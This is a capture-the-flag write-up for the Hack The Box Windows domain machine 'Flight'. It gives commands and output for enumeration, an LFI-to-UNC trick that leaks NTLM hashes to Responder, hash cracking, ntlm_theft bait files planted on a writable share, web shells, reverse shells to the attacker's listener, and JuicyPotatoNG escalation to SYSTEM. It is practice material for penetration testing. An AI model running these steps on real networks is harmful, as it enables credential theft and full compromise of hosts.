## Flight

### Lab Details 

- Difficulty: Hard
- Type: Web App, SMB, AD, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-01 20:34:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: c0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
```
- run `enum4-linux-ng`
```bash
<SNIP>
=============================================================
|    Domain Information via SMB session for 10.129.228.120    |
=============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: G0
NetBIOS domain name: flight
DNS domain: flight.htb
FQDN: g0.flight.htb
Derived membership: domain member
Derived domain: flight

 ===========================================
|    RPC Session Check on 10.129.228.120    |
 ===========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =====================================================
|    Domain Information via RPC for 10.129.228.120    |
 =====================================================
[+] Domain: flight
[+] Domain SID: S-1-5-21-4078382237-1492182817-2568127209
[+] Membership: domain member

 =================================================
|    OS Information via RPC for 10.129.228.120    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null
<SNIP>
```
- no `smb` anonymous access
port 80
- enumerate for files using `ffuf` found nothing useful
- enumerate for directories using `feroxbuster` found nothing useful
- enumerate for subdomains using `ffuf` found `school.flight.htb`
- `school.flight.htb` - home page `http://school.flight.htb/index.php?view=home.html`
- the `url` seems to be injectable `http://school.flight.htb/index.php?view=home.html`, the parameter changes viewing different pages 
- when testing with `php filter` we get error `Suspicious Activity Block!`
![[LFI testing.png]]
- attempt with open redirection we get a connection back 

```bash
$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.228.120] 60515
GET / HTTP/1.1
Host: 10.10.14.82:8000
Connection: close
```

![[LFI confirmed.png]]


```bash
## change the slashes 
http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
```
-  once we have successfully bypassed the `LFI` filter. we can also try to load a file from a `UNC` path. 
- If this works, the machine will have to authenticate to access the share that we specify.
- Use `responder` to intercept any authentication that might occur.
```bash
## on attacker start responder
sudo responder -I tun0 -v
```
- send the payload with `LFI`
```bash
## with LFI
http://school.flight.htb/index.php?view=//10.10.14.82/htb
```
- we get hash back as `svc_apache`
```bash
## we get hash back on responder
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:d4abc9805bad8425:416A1F67B8857FB8DA1BB7FE070CC1A4:0101000000000000807C1E23114BDC01CCBE41E394B01C9E0000000002000800380051005800450001001E00570049004E002D0058004B0038005800530057005800500052003600360004003400570049004E002D0058004B003800580053005700580050005200360036002E0038005100580045002E004C004F00430041004C000300140038005100580045002E004C004F00430041004C000500140038005100580045002E004C004F00430041004C0007000800807C1E23114BDC010600040002000000080030003000000000000000000000000030000026C49FA03B3368FA4E59D60E0243BE95E60799E53F9AC2DBBA56F911B798AAB00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380032000000000000000000
```
- crack it `hashcat` 
```bash
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
## password
S@Ss!K@*t13
```
- we get credential for `svc_apache : S@Ss!K@*t13`
```bash
$ smbmap -H flight.htb -u svc_apache -p 'S@Ss!K@*t13'
[+] IP: flight.htb:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY
```

```bash
$ nxc smb 10.129.228.120 -u 'S.Moon' -p 'S@Ss!K@*t13' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ    
```
- in this scenario that we have write access to the share named `Shared`
- implies that its might be shared with others
- a tool called `ntl_theft` that creates several files that could potentially be used to steal the `NTLMv2` hash of a user just by accessing a folder
- set up `Responder` to intercept any potential authentication requests
```bash
sudo responder -I tun0 -v
```
- clone the `ntl_theft` tool and create our malicious files
```bash
git clone https://github.com/Greenwolf/ntlm_theft
cd ./ntlm_theft
python3 ntlm_theft.py --generate all --server 10.10.14.82 --filename attack
Created: attack/attack.scf (BROWSE TO FOLDER)
Created: attack/attack-(url).url (BROWSE TO FOLDER)
Created: attack/attack-(icon).url (BROWSE TO FOLDER)
Created: attack/attack.lnk (BROWSE TO FOLDER)
Created: attack/attack.rtf (OPEN)
Created: attack/attack-(stylesheet).xml (OPEN)
Created: attack/attack-(fulldocx).xml (OPEN)
Created: attack/attack.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: attack/attack-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: attack/attack-(includepicture).docx (OPEN)
Created: attack/attack-(remotetemplate).docx (OPEN)
Created: attack/attack-(frameset).docx (OPEN)
Created: attack/attack-(externalcell).xlsx (OPEN)
Created: attack/attack.wax (OPEN)
Created: attack/attack.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: attack/attack.asx (OPEN)
Created: attack/attack.jnlp (OPEN)
Created: attack/attack.application (DOWNLOAD AND OPEN)
Created: attack/attack.pdf (OPEN AND ALLOW)
Created: attack/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: attack/attack.library-ms (BROWSE TO FOLDER)
Created: attack/Autorun.inf (BROWSE TO FOLDER)
Created: attack/desktop.ini (BROWSE TO FOLDER)
Created: attack/attack.theme (THEME TO INSTALL)
Generation Complete.
```
- Inside the parentheses, the tool informs us as to what action is required to trigger the file 
- we can start on focusing on those that require the least amount of interaction, just by browsing to that folder
- next step is to upload all the files that have the` (BROWSE TO FOLDER)` requirement to the `Shared` share

#### Initial Foothold 
- attempt to upload the malicious files to `smb` share
```bash
$ impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb
# put ./attack/attack.scf
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```
- **NOTE**: note all file extensions can be uploaded depending on the setup
```
# put ./attack/desktop.ini
```
- wait for few seconds and we get hash on our `responder` 
```bash
$ sudo responder -I tun0 -v
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:3fbeddadf00a2fd0:E3E205F0A6D007EA4A6B53498B735B51:01010000000000000008B4911A4BDC0178F74293F7EFE9200000000002000800520039004F00390001001E00570049004E002D00480031004D005100520059005300430058004F00500004003400570049004E002D00480031004D005100520059005300430058004F0050002E00520039004F0039002E004C004F00430041004C0003001400520039004F0039002E004C004F00430041004C0005001400520039004F0039002E004C004F00430041004C00070008000008B4911A4BDC010600040002000000080030003000000000000000000000000030000026C49FA03B3368FA4E59D60E0243BE95E60799E53F9AC2DBBA56F911B798AAB00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380032000000000000000000
```
- decrypted it with `hashcat`
```bash
$ hashcat -m 5600 c.bum.hash /usr/share/wordlists/rockyou.txt
Tikkycoll_431012284
```
- we get credential `c.bum : Tikkycoll_431012284`
- enumerate `smb` share access with `c.bum`
```bash
$ nxc smb 10.129.228.120 -u 'c.bum' -p 'c' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ,WRITE
```
- we can see that we have write access to `web` share
- since we can write to `web` share we can upload a web shell 
- from the web shell we can get a reverse shell to the target
![[AD/Hard/Flight/web shell.png]]
- we have gained control to target as `svc_apache`
```bash
$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.228.120] 65163
whoami
flight\svc_apache
```
#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `winpeasx86.exe`
```bash
����������͹ Current TCP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         5560            httpd
  TCP        0.0.0.0               88            0.0.0.0               0               Listening         656             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         916             svchost
  TCP        0.0.0.0               389           0.0.0.0               0               Listening         656             lsass
  TCP        0.0.0.0               443           0.0.0.0               0               Listening         5560            httpd
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               464           0.0.0.0               0               Listening         656             lsass
  TCP        0.0.0.0               593           0.0.0.0               0               Listening         916             svchost
  TCP        0.0.0.0               636           0.0.0.0               0               Listening         656             lsass
  TCP        0.0.0.0               3268          0.0.0.0               0               Listening         656             lsass
  TCP        0.0.0.0               3269          0.0.0.0               0               Listening         656             lsass
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               8000          0.0.0.0               0               Listening         4               System
```
- there a few internal facing ports 
- we can use `chisel` to port forward `port 8000`
- visit port 8000 on local host and we see the internal facing website 
![[internal facing website.png]]
- check the `inetpub` directory we see the files hosted there for the internal facing website
```bash
PS C:\inetpub\development> ls
ls


    Directory: C:\inetpub\development


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        11/1/2025   4:22 PM                css                                                                   
d-----        11/1/2025   4:22 PM                fonts                                                                 
d-----        11/1/2025   4:22 PM                img                                                                   
d-----        11/1/2025   4:22 PM                js                                                                    
-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
-a----        4/16/2018   2:23 PM          45949 index.html  
```
- we can inject a `aspx`web shell
![[aspx web shell.png]]
- running as `defaultapppool`
- we will also need to load a reverse shell executable to the target and executed in the web shell to gain access as `defaultapppool`
![[reverse shell from aspx web shell.png]]
```bash
$ nc -lvnp 9003
listening on [any] 9003 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.228.120] 56332
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```
- check our privilege
```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
- we have `SeInpersonatePrivilege`
- load `juicypotato` to target, load another shell as well 
- execute `juicypotato` with shell
```bash
PS C:\Users\Public> .\JuicyPotatoNG.exe -t * -p C:\users\public\shell.exe
.\JuicyPotatoNG.exe -t * -p C:\users\public\shell.exe


	 JuicyPotatoNG
	 by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful! 
```
- we get access as `nt authority\system`
```bash
$ nc -lvnp 9004
listening on [any] 9004 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.228.120] 56383
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system
```
#### Resources

#### Lesson Learned
